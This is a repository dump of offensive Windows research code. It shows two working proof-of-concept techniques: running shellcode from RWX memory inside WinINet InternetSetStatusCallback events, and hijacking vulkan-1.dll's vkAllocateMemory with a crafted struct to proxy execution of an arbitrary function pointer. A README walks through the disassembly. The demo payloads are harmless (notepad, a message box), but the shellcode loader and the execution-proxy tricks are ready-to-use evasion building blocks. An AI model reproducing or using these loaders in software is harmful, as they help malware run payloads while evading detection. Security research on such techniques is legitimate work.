@@ -1,0 +1,469 @@
+Project Path: arc_gmh5225_function-collections_hbn228w0
+
+Source Tree:
+
+```txt
+arc_gmh5225_function-collections_hbn228w0
+├── README.md
+└── hijack_callbacks
+    ├── InternetSetStatusCallback
+    │   ├── Makefile
+    │   └── main.c
+    └── vkAllocateMemory
+        ├── Makefile
+        ├── README.md
+        ├── imgs
+        │   ├── disas.png
+        │   ├── vkAllocateMemory_0_disas.png
+        │   ├── vkAllocateMemory_disas.png
+        │   └── works.png
+        └── main.c
+
+```
+
+`README.md`:
+
+```md
+# Function Collections
+
+[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/whokilleddb)
+
+
+A bunch of interesting functions I have found while digging through windows. 
+
+Most of these funtions have been found using [Hoontr](https://github.com/whokilleddb/hoontr) - another tool I wrote a while back, so if like the tricks contained in this repo, or the tool itself - consider [Buying me a coffee](https://www.buymeacoffee.com/whokilleddb) to help me stay awake through more night.
+
+
+```
+
+`hijack_callbacks/InternetSetStatusCallback/Makefile`:
+
+```
+CC=x86_64-w64-mingw32-gcc
+CFLAGS=-Wall -Wextra -Wconversion -Werror -O0 -m64 -g
+
+.PHONY: all clean
+
+all: main.c 
+	$(CC) $(CFLAGS) main.c -o InternetSetStatusCallback.exe -lwininet 
+
+clean:
+	@rm -f *.exe
+
+```
+
+`hijack_callbacks/InternetSetStatusCallback/main.c`:
+
+```c
+/*
+
+    This module uses InternetSetStatusCallback() to demo how we run certain functions based on things
+    like: DNS name resolution, when we reach out to a certain server, when we send/receiver certain number
+    of bytes, when connections are terminated, etc etc
+
+    Tested on: Windows 11 24H2
+    Author: @whokilleddb
+
+*/
+#include <windows.h>
+#include <wininet.h>
+#include <stdio.h>
+
+#define UNUSED(x) (void)(x)
+
+// notepad.exe shellcode
+unsigned char shellcode[] =  {
+    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
+    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
+    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
+    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
+    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
+    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
+    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
+    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
+    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
+    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
+    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
+    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
+    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
+    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
+    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
+    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x6e, 0x6f, 0x74, 0x65, 0x70,
+    0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00
+};
+
+DWORD shellcode_size = 0;
+LPVOID exec_addr = NULL;
+HANDLE hThread = NULL;
+
+// Status callback function
+void CALLBACK InternetStatusCallback(
+    HINTERNET hInternet,
+    DWORD_PTR dwContext,
+    DWORD dwInternetStatus,
+    LPVOID lpvStatusInformation,
+    DWORD dwStatusInformationLength
+)
+{
+    UNUSED(hInternet);
+    UNUSED(dwContext);
+    UNUSED(dwStatusInformationLength);
+
+    switch (dwInternetStatus)
+    {
+    case INTERNET_STATUS_RESOLVING_NAME: 
+        if (lpvStatusInformation) printf("[+] Resolving name as:\t\t%S\n", (LPCWSTR)lpvStatusInformation);
+        // calculate shellcode size 
+        shellcode_size = sizeof(shellcode);
+        printf("[+] Shellcode size:\t\t%ld\n", shellcode_size);
+        break;
+
+    case INTERNET_STATUS_NAME_RESOLVED:
+        if (lpvStatusInformation) printf("[+] Name resolved as:\t\t%s\n", (LPCSTR)lpvStatusInformation);
+        // Create RWX memory
+        exec_addr = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        printf("[+] Allocated RWX memory to:\t0x%p\n", exec_addr);
+        break;
+
+    case INTERNET_STATUS_CONNECTING_TO_SERVER:
+        printf("[+] Connecting to server\n");
+        memcpy(exec_addr, shellcode, shellcode_size);
+        break;
+
+    case INTERNET_STATUS_CONNECTED_TO_SERVER:
+        if (lpvStatusInformation) printf("[+] Connected to server: %s\n", (LPCSTR)lpvStatusInformation);   
+        DWORD tid;
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_addr, NULL, 0, &tid);
+        break;
+
+    case INTERNET_STATUS_SENDING_REQUEST:
+        printf("[+] Sending request to server\n");
+        break;
+
+    case INTERNET_STATUS_REQUEST_SENT:
+        printf("[+] Sent %ld bytes as request\n", *(DWORD*)lpvStatusInformation);
+        CloseHandle(hThread);
+        break;
+
+    case INTERNET_STATUS_RECEIVING_RESPONSE:
+        printf("[+] Receiving response from the server\n");
+        break;
+
+    case INTERNET_STATUS_RESPONSE_RECEIVED:
+        printf("[+] Received %ld bytes as response\n", *(DWORD*)lpvStatusInformation);
+        break;
+
+    case INTERNET_STATUS_REQUEST_COMPLETE:
+        printf("[+] Request complete\n");
+        break;
+
+    case INTERNET_STATUS_CLOSING_CONNECTION:
+        printf("[+] Closing connection\n");
+        break;
+
+    case INTERNET_STATUS_CONNECTION_CLOSED:
+        printf("[+] Closed connection\n");
+        break;
+
+    default:
+        break;
+    }
+}
+
+int main()
+{
+    HINTERNET hInternet = NULL;
+    HINTERNET hConnect = NULL;
+    HINTERNET hRequest = NULL;
+
+    // Initialize WinINet
+    hInternet = InternetOpenA(
+        "WinINet Status Callback Example/1.0",
+        INTERNET_OPEN_TYPE_DIRECT,
+        NULL,
+        NULL,
+        0
+    );
+
+    if (!hInternet)
+    {
+        printf("[-] InternetOpen failed: 0x%lx\n", GetLastError());
+        return 1;
+    }
+
+    // Set the status callback
+    INTERNET_STATUS_CALLBACK previousCallback = InternetSetStatusCallback(
+        hInternet,
+        InternetStatusCallback
+    );
+
+    if (previousCallback == INTERNET_INVALID_STATUS_CALLBACK)
+    {
+        printf("[-] InternetSetStatusCallback failed: 0x%lx\n", GetLastError());
+        InternetCloseHandle(hInternet);
+        return 1;
+    }
+
+   printf("[+] Status callback set successfully!\n");
+    
+    // Connect to a server
+    hConnect = InternetConnectA(
+        hInternet,
+        "www.example.com",
+        INTERNET_DEFAULT_HTTP_PORT,
+        NULL,
+        NULL,
+        INTERNET_SERVICE_HTTP,
+        0,
+        1 
+    );
+
+    if (!hConnect)
+    {
+        printf("[-] InternetConnect failed: 0x%lx\n", GetLastError());
+        InternetCloseHandle(hInternet);
+        return 1;
+    }
+
+    // Open an HTTP request
+    hRequest = HttpOpenRequestA(
+        hConnect,
+        "GET",
+        "/",
+        NULL,
+        NULL,
+        NULL,
+        INTERNET_FLAG_RELOAD,
+        2 
+    );
+
+    if (!hRequest)
+    {
+        printf("[-] HttpOpenRequest failed: 0x%lx\n", GetLastError());
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        return 1;
+    }
+
+    // Send the request 
+
+    if (HttpSendRequest(hRequest, NULL, 0,NULL, 0))
+    {
+        // Read some response data
+        printf("[+] Request sent successfully!\n");
+
+        char buffer[1024];
+        DWORD bytesRead = 0;
+        InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead);
+    }
+    else
+    {
+        printf("[-] HttpSendRequest failed: 0x%lx\n", GetLastError());
+        
+    }
+
+    // Clean up
+    if (hRequest) InternetCloseHandle(hRequest);
+    if (hConnect) InternetCloseHandle(hConnect);
+
+    // Remove callback before closing the main handle
+    InternetSetStatusCallback(hInternet, NULL);
+
+    if (hInternet) InternetCloseHandle(hInternet);
+
+    return 0;
+}
+```
+
+`hijack_callbacks/vkAllocateMemory/Makefile`:
+
+```
+CC=x86_64-w64-mingw32-gcc
+CFLAGS=-Wall -Wextra -Wconversion -Werror -O0 -m64 -g 
+
+.PHONY: all clean
+
+all: main.c 
+	$(CC) $(CFLAGS) main.c -o vkAllocateMemory.exe
+
+clean:
+	@rm -f *.exe
+
+```
+
+`hijack_callbacks/vkAllocateMemory/README.md`:
+
+```md
+# vkAllocateMemory
+
+[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/whokilleddb)
+
+This module uses `vkAllocateMemory()` function from `vulkan-1.dll`. The `vkAllocateMemory()` function just serves as a trampoline to the unexported `vkAllocateMemory_0()` function. 
+
+> Note: This method also works with the `vkAllocateMemory` function exported by `C:\Windows\System32\Microsoft-Edge-WebView\vulkan-1.dll` but doesn't work with the one exported by `C:\Windows\System32\Microsoft-Edge-WebView\vk_swiftshader.dll`.
+
+Looking at the function in IDA we see the following disassembly:
+
+For `vkAllocateMemory()`:
+
+![](./imgs/vkAllocateMemory_disas.png)
+
+And for `vkAllocateMemory_0()`:
+
+![](./imgs/vkAllocateMemory_0_disas.png)
+
+The first thing I noticed was the string:
+
+```
+vkAllocateMemory: Invalid device [VUID-vkAllocateMemory-device-parameter]
+```
+
+Using [grep.app](https://grep.app/) and searching for this string, we come across the [following code](https://github.com/KhronosGroup/Vulkan-Loader/blob/main/loader/trampoline.c) which has a definition of `vkAllocateMemory()` as:
+
+```c
+LOADER_EXPORT VKAPI_ATTR VkResult VKAPI_CALL vkAllocateMemory(VkDevice device, const VkMemoryAllocateInfo *pAllocateInfo,
+                                                              const VkAllocationCallbacks *pAllocator, VkDeviceMemory *pMemory) {
+    const VkLayerDispatchTable *disp = loader_get_dispatch(device);
+    if (NULL == disp) {
+        loader_log(NULL, VULKAN_LOADER_FATAL_ERROR_BIT | VULKAN_LOADER_ERROR_BIT | VULKAN_LOADER_VALIDATION_BIT, 0,
+                   "vkAllocateMemory: Invalid device [VUID-vkAllocateMemory-device-parameter]");
+        abort(); /* Intentionally fail so user can correct issue. */
+    }
+
+    return disp->AllocateMemory(device, pAllocateInfo, pAllocator, pMemory);
+}
+```
+
+This loosely checks out with the IDA disassembly(which is not very reliable at times but gives us a fair idea about what is happening):
+
+![](./imgs/disas.png)
+
+So here is a rough idea of what _I think_ is happening.
+
+- The function accepts a struct pointer (thanks to [@_winterknife_](https://x.com/_winterknife_) for the insight)
+- It checks if the first element of that struct contains some sort of a signature (`0x10ADED040410ADED`)
+- If the check fails, it terminates the program with an error message
+- If the check succeeds, it invokes the member at the `0x38` offset in the struct and returns it's value
+
+
+So, if we are able to create a struct which has a valid signature and a valid function pointer at the `0x38` offset and pass it to `vkAllocateMemory()`, we should be able to execute the function pointed to by the function. With this knowledge, we create the following PoC:
+
+```c
+EG_STR ex = { 0 };
+
+ex.v1 = (DWORD64) &(ex.v2);
+ex.v2 = CHECKSUM;
+ex.v3 = 0x4343434343434343;
+ex.v4 = 0x4444444444444444;
+ex.v5 = 0x4545454545454545;
+ex.v6 = 0x4646464646464646;
+ex.v7 = 0x4747474747474747;
+ex.v8 = 0x4848484848484848;
+ex.v9 = (DWORD64)super_evil_function;
+
+vkAllocateMemory(&ex);
+```
+
+We need to have a struct with the following nature:
+
+- The second element contains the checksum/signature which is compared in the function in this stub:
+```
+mov r10, CHECKSUM
+cmp [rax], r10
+```
+- the first element contains the _adress where the checksum is stored_. This is because if you look at the IDA graph, the `cmp` statement checks `[rax]` with `r10`, not `rax` with `r10`. Since the checksum value is stored in the second element of the struct, we store that value in the first element.
+- Then, looking at the disassembly, we see that there is a `mov rax, [rax + 0x38]` before `jmp`-ing to the address store in `rax`, so we need to put our function pointer at an offset of `7*sizeof(DWORD64) = 56(0x38)` from the beginning of the struct. 
+- Since the second entry(`v2`) contains the checksum, we essentially need to fill the rest of the elements from `v3` to `v8` with dummy data and finally storing the address of the function we wanna call in `v9`.
+
+With everything in place, we should be able to call `vkAllocateMemory()` with this struct and it should call our `super_evil_function()`.
+
+We compile and run our program and:
+
+![](./imgs/works.png)
+
+**IT WORKS!**
+
+![](https://imgflip.com/s/meme/Excited-Cat.jpg)
+
+> PS: While the original research focused only on `vkAllocateMemory()`, it was pointed by [@owengsmt](https://x.com/owengsmt) that other functions like `vkFreeMemory()` and `vkMapMemory()` also can be used for redirection using this technique. I digged a bit dipper after this and turn out that almost every ducking function from `vulkan-1.dll` can be used for code redirection as long as you get the signature and offsets right.
+
+![](https://pbs.twimg.com/media/GzGu5k3aIAAwXrt?format=jpg&name=medium)
+----
+
+
+
+
+```
+
+`hijack_callbacks/vkAllocateMemory/main.c`:
+
+```c
+/*
+
+    This module uses vkAllocateMemory() from vulkan-1.dll to proxy shellcode execution
+
+    Tested on: Windows 11 24H2
+    Author: @whokilleddb
+
+*/
+
+#include <windows.h>
+#include <stdio.h>
+
+#define CHECKSUM 0x10ADED040410ADED
+
+#define ERR(x) printf("[-] %s failed with error: 0x%lx\n", x, GetLastError())
+
+typedef LPVOID(__stdcall* pVkAllocateMemory)(LPVOID funcptr);
+
+typedef struct example_struct {
+    DWORD64 v1;
+    DWORD64 v2;
+    DWORD64 v3;
+    DWORD64 v4;
+    DWORD64 v5;
+    DWORD64 v6;
+    DWORD64 v7;
+    DWORD64 v8;
+    DWORD64 v9;
+} EG_STR;
+
+void super_evil_function() {
+    MessageBoxA(NULL, "Dark Souls2 is an amazing game", "DB Says", 0);
+}
+
+int main() {
+    EG_STR ex = { 0 };
+    
+    ex.v1 = (DWORD64) &(ex.v2);
+    ex.v2 = CHECKSUM;
+    ex.v3 = 0x4343434343434343;
+    ex.v4 = 0x4444444444444444;
+    ex.v5 = 0x4545454545454545;
+    ex.v6 = 0x4646464646464646;
+    ex.v7 = 0x4747474747474747;
+    ex.v8 = 0x4848484848484848;
+    ex.v9 = (DWORD64)super_evil_function;
+
+    HMODULE hVulkan = LoadLibraryW(L"vulkan-1.dll");
+    if (hVulkan == NULL) {
+        ERR("LoadLibraryW");
+        return -1;
+    }
+
+    pVkAllocateMemory vkAllocateMemory = (pVkAllocateMemory)(LPVOID)GetProcAddress(hVulkan, "vkAllocateMemory");
+    if (vkAllocateMemory == NULL) {
+        ERR("vkAllocateMemory");
+        return -1;
+    }
+
+    printf("[+] vkAllocateMemory() found at: 0x%p\n", vkAllocateMemory);
+
+    vkAllocateMemory(&ex);
+
+    return 0;
+}
+
+
+```
